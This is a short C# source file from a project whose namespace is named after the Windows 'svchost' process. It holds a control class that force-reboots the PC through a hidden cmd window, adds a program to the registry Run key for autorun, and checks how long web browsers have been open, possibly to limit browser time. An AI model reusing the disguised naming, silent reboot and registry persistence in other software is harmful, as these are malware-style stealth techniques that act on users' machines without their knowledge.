using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace svchost.Controller
{
    public static class CompController
    {
        /// <summary>
        /// Reboot the computer
        /// </summary>
        public static void Reboot()
        {
            ProcessStartInfo p = new ProcessStartInfo("cmd", "/r shutdown -f -r -t 0") { CreateNoWindow = true };
            Process.Start(p);
        }

        /// <summary>
        /// Add program to the autorun
        /// </summary>
        public static void AddToAutoRun(string name, string path)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            try
            {
                registryKey.SetValue(name, path);
            }
            catch { }
        }

        /// <summary>
        /// Check the time of opening firefox, chrome or opera
        /// </summary>
        /// <param name="limitSeconds">Maximum time</param>
        /// <returns>True if start time of any of browsers is greater than limit otherwise false</returns>
        public static bool CheckBrowsers(int limitSeconds)
        {
            List<Process> processes = new List<Process>();
            processes.AddRange(Process.GetProcessesByName("firefox"));
            processes.AddRange(Process.GetProcessesByName("chrome"));
            processes.AddRange(Process.GetProcessesByName("opera"));

            if(processes.Any((item) => DateTime.Now.Subtract(item.StartTime).TotalSeconds > limitSeconds))
            {
                return true;
            }

            return false;
        }
    }
}
